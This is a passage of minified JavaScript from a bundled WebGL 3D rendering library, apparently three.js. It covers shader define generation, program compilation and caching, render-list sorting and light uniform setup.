"+i.alphaMapUv:"",i.lightMapUv?"#define LIGHTMAP_UV "+i.lightMapUv:"",i.aoMapUv?"#define AOMAP_UV "+i.aoMapUv:"",i.emissiveMapUv?"#define EMISSIVEMAP_UV "+i.emissiveMapUv:"",i.bumpMapUv?"#define BUMPMAP_UV "+i.bumpMapUv:"",i.normalMapUv?"#define NORMALMAP_UV "+i.normalMapUv:"",i.displacementMapUv?"#define DISPLACEMENTMAP_UV "+i.displacementMapUv:"",i.metalnessMapUv?"#define METALNESSMAP_UV "+i.metalnessMapUv:"",i.roughnessMapUv?"#define ROUGHNESSMAP_UV "+i.roughnessMapUv:"",i.anisotropyMapUv?"#define ANISOTROPYMAP_UV "+i.anisotropyMapUv:"",i.clearcoatMapUv?"#define CLEARCOATMAP_UV "+i.clearcoatMapUv:"",i.clearcoatNormalMapUv?"#define CLEARCOAT_NORMALMAP_UV "+i.clearcoatNormalMapUv:"",i.clearcoatRoughnessMapUv?"#define CLEARCOAT_ROUGHNESSMAP_UV "+i.clearcoatRoughnessMapUv:"",i.iridescenceMapUv?"#define IRIDESCENCEMAP_UV "+i.iridescenceMapUv:"",i.iridescenceThicknessMapUv?"#define IRIDESCENCE_THICKNESSMAP_UV "+i.iridescenceThicknessMapUv:"",i.sheenColorMapUv?"#define SHEEN_COLORMAP_UV "+i.sheenColorMapUv:"",i.sheenRoughnessMapUv?"#define SHEEN_ROUGHNESSMAP_UV "+i.sheenRoughnessMapUv:"",i.specularMapUv?"#define SPECULARMAP_UV "+i.specularMapUv:"",i.specularColorMapUv?"#define SPECULAR_COLORMAP_UV "+i.specularColorMapUv:"",i.specularIntensityMapUv?"#define SPECULAR_INTENSITYMAP_UV "+i.specularIntensityMapUv:"",i.transmissionMapUv?"#define TRANSMISSIONMAP_UV "+i.transmissionMapUv:"",i.thicknessMapUv?"#define THICKNESSMAP_UV "+i.thicknessMapUv:"",i.vertexTangents&&i.flatShading===!1?"#define USE_TANGENT":"",i.vertexNormals?"#define HAS_NORMAL":"",i.vertexColors?"#define USE_COLOR":"",i.vertexAlphas?"#define USE_COLOR_ALPHA":"",i.vertexUv1s?"#define USE_UV1":"",i.vertexUv2s?"#define USE_UV2":"",i.vertexUv3s?"#define USE_UV3":"",i.pointsUvs?"#define USE_POINTS_UV":"",i.flatShading?"#define FLAT_SHADED":"",i.skinning?"#define USE_SKINNING":"",i.morphTargets?"#define USE_MORPHTARGETS":"",i.morphNormals&&i.flatShading===!1?"#define USE_MORPHNORMALS":"",i.morphColors?"#define USE_MORPHCOLORS":"",i.morphTargetsCount>0?"#define MORPHTARGETS_TEXTURE_STRIDE "+i.morphTextureStride:"",i.morphTargetsCount>0?"#define MORPHTARGETS_COUNT "+i.morphTargetsCount:"",i.doubleSided?"#define DOUBLE_SIDED":"",i.flipSided?"#define FLIP_SIDED":"",i.shadowMapEnabled?"#define USE_SHADOWMAP":"",i.shadowMapEnabled?"#define "+m:"",i.sizeAttenuation?"#define USE_SIZEATTENUATION":"",i.numLightProbes>0?"#define USE_LIGHT_PROBES":"",i.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",i.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","	attribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","	attribute vec3 instanceColor;","#endif","#ifdef USE_INSTANCING_MORPH","	uniform sampler2D morphTexture;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_UV1","	attribute vec2 uv1;","#endif","#ifdef USE_UV2","	attribute vec2 uv2;","#endif","#ifdef USE_UV3","	attribute vec2 uv3;","#endif","#ifdef USE_TANGENT","	attribute vec4 tangent;","#endif","#if defined( USE_COLOR_ALPHA )","	attribute vec4 color;","#elif defined( USE_COLOR )","	attribute vec3 color;","#endif","#ifdef USE_SKINNING","	attribute vec4 skinIndex;","	attribute vec4 skinWeight;","#endif",`
`].filter(ml).join(`
`),S=[vx(i),"#define SHADER_TYPE "+i.shaderType,"#define SHADER_NAME "+i.shaderName,T,i.useFog&&i.fog?"#define USE_FOG":"",i.useFog&&i.fogExp2?"#define FOG_EXP2":"",i.alphaToCoverage?"#define ALPHA_TO_COVERAGE":"",i.map?"#define USE_MAP":"",i.matcap?"#define USE_MATCAP":"",i.envMap?"#define USE_ENVMAP":"",i.envMap?"#define "+p:"",i.envMap?"#define "+x:"",i.envMap?"#define "+v:"",_?"#define CUBEUV_TEXEL_WIDTH "+_.texelWidth:"",_?"#define CUBEUV_TEXEL_HEIGHT "+_.texelHeight:"",_?"#define CUBEUV_MAX_MIP "+_.maxMip+".0":"",i.lightMap?"#define USE_LIGHTMAP":"",i.aoMap?"#define USE_AOMAP":"",i.bumpMap?"#define USE_BUMPMAP":"",i.normalMap?"#define USE_NORMALMAP":"",i.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",i.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",i.packedNormalMap?"#define USE_PACKED_NORMALMAP":"",i.emissiveMap?"#define USE_EMISSIVEMAP":"",i.anisotropy?"#define USE_ANISOTROPY":"",i.anisotropyMap?"#define USE_ANISOTROPYMAP":"",i.clearcoat?"#define USE_CLEARCOAT":"",i.clearcoatMap?"#define USE_CLEARCOATMAP":"",i.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",i.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",i.dispersion?"#define USE_DISPERSION":"",i.retroreflection?"#define USE_RETROREFLECTION":"",i.iridescence?"#define USE_IRIDESCENCE":"",i.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",i.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",i.specularMap?"#define USE_SPECULARMAP":"",i.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",i.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",i.roughnessMap?"#define USE_ROUGHNESSMAP":"",i.metalnessMap?"#define USE_METALNESSMAP":"",i.alphaMap?"#define USE_ALPHAMAP":"",i.alphaTest?"#define USE_ALPHATEST":"",i.alphaHash?"#define USE_ALPHAHASH":"",i.sheen?"#define USE_SHEEN":"",i.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",i.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",i.transmission?"#define USE_TRANSMISSION":"",i.transmissionMap?"#define USE_TRANSMISSIONMAP":"",i.thicknessMap?"#define USE_THICKNESSMAP":"",i.vertexTangents&&i.flatShading===!1?"#define USE_TANGENT":"",i.vertexColors||i.instancingColor?"#define USE_COLOR":"",i.vertexAlphas||i.batchingColor?"#define USE_COLOR_ALPHA":"",i.vertexUv1s?"#define USE_UV1":"",i.vertexUv2s?"#define USE_UV2":"",i.vertexUv3s?"#define USE_UV3":"",i.pointsUvs?"#define USE_POINTS_UV":"",i.gradientMap?"#define USE_GRADIENTMAP":"",i.flatShading?"#define FLAT_SHADED":"",i.doubleSided?"#define DOUBLE_SIDED":"",i.flipSided?"#define FLIP_SIDED":"",i.shadowMapEnabled?"#define USE_SHADOWMAP":"",i.shadowMapEnabled?"#define "+m:"",i.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",i.numLightProbes>0?"#define USE_LIGHT_PROBES":"",i.numLightProbeGrids>0?"#define USE_LIGHT_PROBES_GRID":"",i.decodeVideoTexture?"#define DECODE_VIDEO_TEXTURE":"",i.decodeVideoTextureEmissive?"#define DECODE_VIDEO_TEXTURE_EMISSIVE":"",i.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",i.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",i.toneMapping!==ra?"#define TONE_MAPPING":"",i.toneMapping!==ra?me.tonemapping_pars_fragment:"",i.toneMapping!==ra?zR("toneMapping",i.toneMapping):"",i.dithering?"#define DITHERING":"",i.opaque?"#define OPAQUE":"",me.colorspace_pars_fragment,PR("linearToOutputTexel",i.outputColorSpace),BR(),i.useDepthPacking?"#define DEPTH_PACKING "+i.depthPacking:"",`
`].filter(ml).join(`
`)),d=Vp(d),d=mx(d,i),d=gx(d,i),h=Vp(h),h=mx(h,i),h=gx(h,i),d=_x(d),h=_x(h),i.isRawShaderMaterial!==!0&&(N=`#version 300 es
`,y=[E,"#define attribute in","#define varying out","#define texture2D texture"].join(`
`)+`
`+y,S=["#define varying in",i.glslVersion===Av?"":"layout(location = 0) out highp vec4 pc_fragColor;",i.glslVersion===Av?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join(`
`)+`
`+S);const B=N+y+d,C=N+S+h,U=dx(c,c.VERTEX_SHADER,B),D=dx(c,c.FRAGMENT_SHADER,C);c.attachShader(w,U),c.attachShader(w,D),i.index0AttributeName!==void 0?c.bindAttribLocation(w,0,i.index0AttributeName):i.hasPositionAttribute===!0&&c.bindAttribLocation(w,0,"position"),c.linkProgram(w);function P(V){if(o.debug.checkShaderErrors){const $=c.getProgramInfoLog(w)||"",ft=c.getShaderInfoLog(U)||"",j=c.getShaderInfoLog(D)||"",et=$.trim(),q=ft.trim(),W=j.trim();let ht=!0,lt=!0;if(c.getProgramParameter(w,c.LINK_STATUS)===!1)if(ht=!1,typeof o.debug.onShaderError=="function")o.debug.onShaderError(c,w,U,D);else{const mt=px(c,U,"vertex"),gt=px(c,D,"fragment");Ie("WebGLProgram: Shader Error "+c.getError()+" - VALIDATE_STATUS "+c.getProgramParameter(w,c.VALIDATE_STATUS)+`

Material Name: `+V.name+`
Material Type: `+V.type+`

Program Info Log: `+et+`
`+mt+`
`+gt)}else et!==""?se("WebGLProgram: Program Info Log:",et):(q===""||W==="")&&(lt=!1);lt&&(V.diagnostics={runnable:ht,programLog:et,vertexShader:{log:q,prefix:y},fragmentShader:{log:W,prefix:S}})}c.deleteShader(U),c.deleteShader(D),b=new Au(c,w),L=GR(c,w)}let b;this.getUniforms=function(){return b===void 0&&P(this),b};let L;this.getAttributes=function(){return L===void 0&&P(this),L};let F=i.rendererExtensionParallelShaderCompile===!1;return this.isReady=function(){return F===!1&&(F=c.getProgramParameter(w,DR)),F},this.destroy=function(){s.releaseStatesOfProgram(this),c.deleteProgram(w),this.program=void 0},this.type=i.shaderType,this.name=i.shaderName,this.id=UR++,this.cacheKey=e,this.usedTimes=1,this.program=w,this.vertexShader=U,this.fragmentShader=D,this}let i3=0;class a3{constructor(){this.shaderCache=new Map,this.materialCache=new Map}update(e,i,s){const c=this._getShaderCacheForMaterial(e);return c.has(i)===!1&&(c.add(i),i.usedTimes++),c.has(s)===!1&&(c.add(s),s.usedTimes++),this}remove(e){const i=this.materialCache.get(e);for(const s of i)s.usedTimes--,s.usedTimes===0&&this.shaderCache.delete(s.code);return this.materialCache.delete(e),this}getVertexShaderStage(e){return this._getShaderStage(e.vertexShader)}getFragmentShaderStage(e){return this._getShaderStage(e.fragmentShader)}dispose(){this.shaderCache.clear(),this.materialCache.clear()}_getShaderCacheForMaterial(e){const i=this.materialCache;let s=i.get(e);return s===void 0&&(s=new Set,i.set(e,s)),s}_getShaderStage(e){const i=this.shaderCache;let s=i.get(e);return s===void 0&&(s=new r3(e),i.set(e,s)),s}}class r3{constructor(e){this.id=i3++,this.code=e,this.usedTimes=0}}function s3(o){return o===jr||o===Ru||o===Cu}function o3(o,e,i,s,c,f){const d=new Zx,h=new a3,m=new Set,p=[],x=new Map,v=s.logarithmicDepthBuffer;let _=s.precision;const E={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distance",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"};function T(b){return m.add(b),b===0?"uv":`uv${b}`}function w(b,L,F,V,$,ft){const j=V.fog,et=$.geometry,q=b.isMeshStandardMaterial||b.isMeshLambertMaterial||b.isMeshPhongMaterial?V.environment:null,W=b.isMeshStandardMaterial||b.isMeshLambertMaterial&&!b.envMap||b.isMeshPhongMaterial&&!b.envMap,ht=e.get(b.envMap||q,W),lt=ht&&ht.mapping===Iu?ht.image.height:null,mt=E[b.type];b.precision!==null&&(_=s.getMaxPrecision(b.precision),_!==b.precision&&se("WebGLProgram.getParameters:",b.precision,"not supported, using",_,"instead."));const gt=et.morphAttributes.position||et.morphAttributes.normal||et.morphAttributes.color,Bt=gt!==void 0?gt.length:0;let Ut=0;et.morphAttributes.position!==void 0&&(Ut=1),et.morphAttributes.normal!==void 0&&(Ut=2),et.morphAttributes.color!==void 0&&(Ut=3);let z,pt,At,Y;if(mt){const Re=na[mt];z=Re.vertexShader,pt=Re.fragmentShader}else{z=b.vertexShader,pt=b.fragmentShader;const Re=h.getVertexShaderStage(b),ue=h.getFragmentShaderStage(b);h.update(b,Re,ue),At=Re.id,Y=ue.id}const ut=o.getRenderTarget(),Tt=o.state.buffers.depth.getReversed(),wt=$.isInstancedMesh===!0,_t=$.isBatchedMesh===!0,Rt=!!b.map,Le=!!b.matcap,le=!!ht,ge=!!b.aoMap,Se=!!b.lightMap,ee=!!b.bumpMap&&b.wireframe===!1,ie=!!b.normalMap,Ve=!!b.displacementMap,fn=!!b.emissiveMap,Pe=!!b.metalnessMap,$e=!!b.roughnessMap,k=b.anisotropy>0,en=b.clearcoat>0,Oe=b.dispersion>0,O=b.retroreflectivity>0,M=b.iridescence>0,tt=b.sheen>0,ot=b.transmission>0,vt=k&&!!b.anisotropyMap,Ct=en&&!!b.clearcoatMap,Lt=en&&!!b.clearcoatNormalMap,xt=en&&!!b.clearcoatRoughnessMap,Et=M&&!!b.iridescenceMap,Dt=M&&!!b.iridescenceThicknessMap,$t=tt&&!!b.sheenColorMap,Ft=tt&&!!b.sheenRoughnessMap,zt=!!b.specularMap,Wt=!!b.specularColorMap,ne=!!b.specularIntensityMap,ce=ot&&!!b.transmissionMap,X=ot&&!!b.thicknessMap,Nt=!!b.gradientMap,Mt=!!b.alphaMap,Ot=b.alphaTest>0,kt=!!b.alphaHash,bt=!!b.extensions;let Jt=ra;b.toneMapped&&(ut===null||ut.isXRRenderTarget===!0)&&(Jt=o.toneMapping);const Xt={shaderID:mt,shaderType:b.type,shaderName:b.name,vertexShader:z,fragmentShader:pt,defines:b.defines,customVertexShaderID:At,customFragmentShaderID:Y,isRawShaderMaterial:b.isRawShaderMaterial===!0,glslVersion:b.glslVersion,precision:_,batching:_t,batchingColor:_t&&$._colorsTexture!==null,instancing:wt,instancingColor:wt&&$.instanceColor!==null,instancingMorph:wt&&$.morphTexture!==null,outputColorSpace:ut===null?o.outputColorSpace:ut.isXRRenderTarget===!0?ut.texture.colorSpace:we.workingColorSpace,alphaToCoverage:!!b.alphaToCoverage,map:Rt,matcap:Le,envMap:le,envMapMode:le&&ht.mapping,envMapCubeUVHeight:lt,aoMap:ge,lightMap:Se,bumpMap:ee,normalMap:ie,displacementMap:Ve,emissiveMap:fn,normalMapObjectSpace:ie&&b.normalMapType===HE,normalMapTangentSpace:ie&&b.normalMapType===Tv,packedNormalMap:ie&&b.normalMapType===Tv&&s3(b.normalMap.format),metalnessMap:Pe,roughnessMap:$e,anisotropy:k,anisotropyMap:vt,clearcoat:en,clearcoatMap:Ct,clearcoatNormalMap:Lt,clearcoatRoughnessMap:xt,dispersion:Oe,retroreflection:O,iridescence:M,iridescenceMap:Et,iridescenceThicknessMap:Dt,sheen:tt,sheenColorMap:$t,sheenRoughnessMap:Ft,specularMap:zt,specularColorMap:Wt,specularIntensityMap:ne,transmission:ot,transmissionMap:ce,thicknessMap:X,gradientMap:Nt,opaque:b.transparent===!1&&b.blending===gl&&b.alphaToCoverage===!1,alphaMap:Mt,alphaTest:Ot,alphaHash:kt,combine:b.combine,mapUv:Rt&&T(b.map.channel),aoMapUv:ge&&T(b.aoMap.channel),lightMapUv:Se&&T(b.lightMap.channel),bumpMapUv:ee&&T(b.bumpMap.channel),normalMapUv:ie&&T(b.normalMap.channel),displacementMapUv:Ve&&T(b.displacementMap.channel),emissiveMapUv:fn&&T(b.emissiveMap.channel),metalnessMapUv:Pe&&T(b.metalnessMap.channel),roughnessMapUv:$e&&T(b.roughnessMap.channel),anisotropyMapUv:vt&&T(b.anisotropyMap.channel),clearcoatMapUv:Ct&&T(b.clearcoatMap.channel),clearcoatNormalMapUv:Lt&&T(b.clearcoatNormalMap.channel),clearcoatRoughnessMapUv:xt&&T(b.clearcoatRoughnessMap.channel),iridescenceMapUv:Et&&T(b.iridescenceMap.channel),iridescenceThicknessMapUv:Dt&&T(b.iridescenceThicknessMap.channel),sheenColorMapUv:$t&&T(b.sheenColorMap.channel),sheenRoughnessMapUv:Ft&&T(b.sheenRoughnessMap.channel),specularMapUv:zt&&T(b.specularMap.channel),specularColorMapUv:Wt&&T(b.specularColorMap.channel),specularIntensityMapUv:ne&&T(b.specularIntensityMap.channel),transmissionMapUv:ce&&T(b.transmissionMap.channel),thicknessMapUv:X&&T(b.thicknessMap.channel),alphaMapUv:Mt&&T(b.alphaMap.channel),vertexTangents:!!et.attributes.tangent&&(ie||k),vertexNormals:!!et.attributes.normal,vertexColors:b.vertexColors,vertexAlphas:b.vertexColors===!0&&!!et.attributes.color&&et.attributes.color.itemSize===4,pointsUvs:$.isPoints===!0&&!!et.attributes.uv&&(Rt||Mt),fog:!!j,useFog:b.fog===!0,fogExp2:!!j&&j.isFogExp2,flatShading:b.wireframe===!1&&(b.flatShading===!0||et.attributes.normal===void 0&&ie===!1&&(b.isMeshLambertMaterial||b.isMeshPhongMaterial||b.isMeshStandardMaterial||b.isMeshPhysicalMaterial)),sizeAttenuation:b.sizeAttenuation===!0,logarithmicDepthBuffer:v,reversedDepthBuffer:Tt,skinning:$.isSkinnedMesh===!0,hasPositionAttribute:et.attributes.position!==void 0,morphTargets:et.morphAttributes.position!==void 0,morphNormals:et.morphAttributes.normal!==void 0,morphColors:et.morphAttributes.color!==void 0,morphTargetsCount:Bt,morphTextureStride:Ut,numSunLights:L.sun.length,numDirLights:L.directional.length,numPointLights:L.point.length,numSpotLights:L.spot.length,numSpotLightMaps:L.spotLightMap.length,numRectAreaLights:L.rectArea.length,numHemiLights:L.hemi.length,numSunLightShadows:L.sunShadowMap.length,numDirLightShadows:L.directionalShadowMap.length,numPointLightShadows:L.pointShadowMap.length,numSpotLightShadows:L.spotShadowMap.length,numSpotLightShadowsWithMaps:L.numSpotLightShadowsWithMaps,numLightProbes:L.numLightProbes,numLightProbeGrids:ft.length,numClippingPlanes:f.numPlanes,numClipIntersection:f.numIntersection,dithering:b.dithering,shadowMapEnabled:o.shadowMap.enabled&&F.length>0,shadowMapType:o.shadowMap.type,toneMapping:Jt,decodeVideoTexture:Rt&&b.map.isVideoTexture===!0&&we.getTransfer(b.map.colorSpace)===qe,decodeVideoTextureEmissive:fn&&b.emissiveMap.isVideoTexture===!0&&we.getTransfer(b.emissiveMap.colorSpace)===qe,premultipliedAlpha:b.premultipliedAlpha,doubleSided:b.side===wa,flipSided:b.side===Jn,useDepthPacking:b.depthPacking>=0,depthPacking:b.depthPacking||0,index0AttributeName:b.index0AttributeName,extensionClipCullDistance:bt&&b.extensions.clipCullDistance===!0&&i.has("WEBGL_clip_cull_distance"),extensionMultiDraw:(bt&&b.extensions.multiDraw===!0||_t)&&i.has("WEBGL_multi_draw"),rendererExtensionParallelShaderCompile:i.has("KHR_parallel_shader_compile"),customProgramCacheKey:b.customProgramCacheKey()};return Xt.vertexUv1s=m.has(1),Xt.vertexUv2s=m.has(2),Xt.vertexUv3s=m.has(3),m.clear(),Xt}function y(b){const L=[];if(b.shaderID?L.push(b.shaderID):(L.push(b.customVertexShaderID),L.push(b.customFragmentShaderID)),b.defines!==void 0)for(const F in b.defines)L.push(F),L.push(b.defines[F]);return b.isRawShaderMaterial===!1&&(S(L,b),N(L,b),L.push(o.outputColorSpace)),L.push(b.customProgramCacheKey),L.join()}function S(b,L){b.push(L.precision),b.push(L.outputColorSpace),b.push(L.envMapMode),b.push(L.envMapCubeUVHeight),b.push(L.mapUv),b.push(L.alphaMapUv),b.push(L.lightMapUv),b.push(L.aoMapUv),b.push(L.bumpMapUv),b.push(L.normalMapUv),b.push(L.displacementMapUv),b.push(L.emissiveMapUv),b.push(L.metalnessMapUv),b.push(L.roughnessMapUv),b.push(L.anisotropyMapUv),b.push(L.clearcoatMapUv),b.push(L.clearcoatNormalMapUv),b.push(L.clearcoatRoughnessMapUv),b.push(L.iridescenceMapUv),b.push(L.iridescenceThicknessMapUv),b.push(L.sheenColorMapUv),b.push(L.sheenRoughnessMapUv),b.push(L.specularMapUv),b.push(L.specularColorMapUv),b.push(L.specularIntensityMapUv),b.push(L.transmissionMapUv),b.push(L.thicknessMapUv),b.push(L.combine),b.push(L.fogExp2),b.push(L.sizeAttenuation),b.push(L.morphTargetsCount),b.push(L.morphAttributeCount),b.push(L.numSunLights),b.push(L.numDirLights),b.push(L.numPointLights),b.push(L.numSpotLights),b.push(L.numSpotLightMaps),b.push(L.numHemiLights),b.push(L.numRectAreaLights),b.push(L.numSunLightShadows),b.push(L.numDirLightShadows),b.push(L.numPointLightShadows),b.push(L.numSpotLightShadows),b.push(L.numSpotLightShadowsWithMaps),b.push(L.numLightProbes),b.push(L.shadowMapType),b.push(L.toneMapping),b.push(L.numClippingPlanes),b.push(L.numClipIntersection),b.push(L.depthPacking)}function N(b,L){d.disableAll(),L.instancing&&d.enable(0),L.instancingColor&&d.enable(1),L.instancingMorph&&d.enable(2),L.matcap&&d.enable(3),L.envMap&&d.enable(4),L.normalMapObjectSpace&&d.enable(5),L.normalMapTangentSpace&&d.enable(6),L.clearcoat&&d.enable(7),L.iridescence&&d.enable(8),L.alphaTest&&d.enable(9),L.vertexColors&&d.enable(10),L.vertexAlphas&&d.enable(11),L.vertexUv1s&&d.enable(12),L.vertexUv2s&&d.enable(13),L.vertexUv3s&&d.enable(14),L.vertexTangents&&d.enable(15),L.anisotropy&&d.enable(16),L.alphaHash&&d.enable(17),L.batching&&d.enable(18),L.dispersion&&d.enable(19),L.retroreflection&&d.enable(24),L.batchingColor&&d.enable(20),L.gradientMap&&d.enable(21),L.packedNormalMap&&d.enable(22),L.vertexNormals&&d.enable(23),b.push(d.mask),d.disableAll(),L.fog&&d.enable(0),L.useFog&&d.enable(1),L.flatShading&&d.enable(2),L.logarithmicDepthBuffer&&d.enable(3),L.reversedDepthBuffer&&d.enable(4),L.skinning&&d.enable(5),L.morphTargets&&d.enable(6),L.morphNormals&&d.enable(7),L.morphColors&&d.enable(8),L.premultipliedAlpha&&d.enable(9),L.shadowMapEnabled&&d.enable(10),L.doubleSided&&d.enable(11),L.flipSided&&d.enable(12),L.useDepthPacking&&d.enable(13),L.dithering&&d.enable(14),L.transmission&&d.enable(15),L.sheen&&d.enable(16),L.opaque&&d.enable(17),L.pointsUvs&&d.enable(18),L.decodeVideoTexture&&d.enable(19),L.decodeVideoTextureEmissive&&d.enable(20),L.alphaToCoverage&&d.enable(21),L.numLightProbeGrids>0&&d.enable(22),L.hasPositionAttribute&&d.enable(23),b.push(d.mask)}function B(b){const L=E[b.type];let F;if(L){const V=na[L];F=wb.clone(V.uniforms)}else F=b.uniforms;return F}function C(b,L){let F=x.get(L);return F!==void 0?++F.usedTimes:(F=new n3(o,L,b,c),p.push(F),x.set(L,F)),F}function U(b){if(--b.usedTimes===0){const L=p.indexOf(b);p[L]=p[p.length-1],p.pop(),x.delete(b.cacheKey),b.destroy()}}function D(b){h.remove(b)}function P(){h.dispose()}return{getParameters:w,getProgramCacheKey:y,getUniforms:B,acquireProgram:C,releaseProgram:U,releaseShaderCache:D,programs:p,dispose:P}}function l3(){let o=new WeakMap;function e(d){return o.has(d)}function i(d){let h=o.get(d);return h===void 0&&(h={},o.set(d,h)),h}function s(d){o.delete(d)}function c(d,h,m){o.get(d)[h]=m}function f(){o=new WeakMap}return{has:e,get:i,remove:s,update:c,dispose:f}}function c3(o,e){return o.groupOrder!==e.groupOrder?o.groupOrder-e.groupOrder:o.renderOrder!==e.renderOrder?o.renderOrder-e.renderOrder:o.material.id!==e.material.id?o.material.id-e.material.id:o.materialVariant!==e.materialVariant?o.materialVariant-e.materialVariant:o.z!==e.z?o.z-e.z:o.id-e.id}function xx(o,e){return o.groupOrder!==e.groupOrder?o.groupOrder-e.groupOrder:o.renderOrder!==e.renderOrder?o.renderOrder-e.renderOrder:o.z!==e.z?e.z-o.z:o.id-e.id}function Sx(){const o=[];let e=0;const i=[],s=[],c=[];function f(){e=0,i.length=0,s.length=0,c.length=0}function d(_){let E=0;return _.isInstancedMesh&&(E+=2),_.isSkinnedMesh&&(E+=1),E}function h(_,E,T,w,y,S){let N=o[e];return N===void 0?(N={id:_.id,object:_,geometry:E,material:T,materialVariant:d(_),groupOrder:w,renderOrder:_.renderOrder,z:y,group:S},o[e]=N):(N.id=_.id,N.object=_,N.geometry=E,N.material=T,N.materialVariant=d(_),N.groupOrder=w,N.renderOrder=_.renderOrder,N.z=y,N.group=S),e++,N}function m(_,E,T,w,y,S,N){N.reversedDepth===!0&&(y=-y);const B=h(_,E,T,w,y,S);T.transmission>0?s.push(B):T.transparent===!0?c.push(B):i.push(B)}function p(_,E,T,w,y,S){const N=h(_,E,T,w,y,S);T.transmission>0?s.unshift(N):T.transparent===!0?c.unshift(N):i.unshift(N)}function x(_,E){i.length>1&&i.sort(_||c3),s.length>1&&s.sort(E||xx),c.length>1&&c.sort(E||xx)}function v(){for(let _=e,E=o.length;_<E;_++){const T=o[_];if(T.id===null)break;T.id=null,T.object=null,T.geometry=null,T.material=null,T.group=null}}return{opaque:i,transmissive:s,transparent:c,init:f,push:m,unshift:p,finish:v,sort:x}}function u3(){let o=new WeakMap;function e(s,c){const f=o.get(s);let d;return f===void 0?(d=new Sx,o.set(s,[d])):c>=f.length?(d=new Sx,f.push(d)):d=f[c],d}function i(){o=new WeakMap}return{get:e,dispose:i}}function f3(){const o={};return{get:function(e){if(o[e.id]!==void 0)return o[e.id];let i;switch(e.type){case"SunLight":case"DirectionalLight":i={direction:new it,color:new ze};break;case"SpotLight":i={position:new it,direction:new it,color:new ze,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":i={position:new it,color:new ze,distance:0,decay:0};break;case"HemisphereLight":i={direction:new it,skyColor:new ze,groundColor:new ze};break;case"RectAreaLight":i={color:new ze,position:new it,halfWidth:new it,halfHeight:new it};break}return o[e.id]=i,i}}}function d3(){const o={};return{get:function(e){if(o[e.id]!==void 0)return o[e.id];let i;switch(e.type){case"SunLight":case"DirectionalLight":i={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Ue};break;case"SpotLight":i={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Ue};break;case"PointLight":i={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Ue,shadowCameraNear:1,shadowCameraFar:1e3};break}return o[e.id]=i,i}}}let h3=0;function p3(o,e){return(e.castShadow?2:0)-(o.castShadow?2:0)+(e.map?1:0)-(o.map?1:0)}function m3(o){const e=new f3,i=d3(),s={version:0,hash:{sunLength:-1,directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numSunShadows:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1,numSpotMaps:-1,numLightProbes:-1},ambient:[0,0,0],probe:[],sun:[],sunShadow:[],sunShadowMap:[],sunShadowMatrix:[],sunShadowCascade:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotLightMap:[],spotShadow:[],spotShadowMap:[],spotLightMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numSpotLightShadowsWithMaps:0,numLightProbes:0};for(let p=0;p<9;p++)s.probe.push(new it);const c=new it,f=new cn,d=new cn;function h(p){let x=0,v=0,_=0;for(let $=0;$<9;$++)s.probe[$].set(0,0,0);let E=0,T=0,w=0,y=0,S=0,N=0,B=0,C=0,U=0,D=0,P=0,b=0,L=0,F=0;p.sort(p3);for(let $=0,ft=p.length;$<ft;$++){const j=p[$],et=j.color,q=j.intensity,W=j.distance;let ht=null;if(j.shadow&&j.shadow.map&&(j.shadow.map.texture.format===jr?ht=j.shadow.map.texture:ht=j.shadow.map.depthTexture||j.shadow.map.texture),j.isAmbientLight)x+=et.r*q,v+=et.g*q,_+=et.b*q;else if(j.isLightProbe){for(let lt=0;lt<9;lt++)s.probe[lt].addScaledVector(j.sh.coefficients[lt],q);F++}else if(j.isSunLight){const lt=e.get(j);if(lt.color.copy(j.color).multiplyScalar(j.intensity),j.castShadow){const 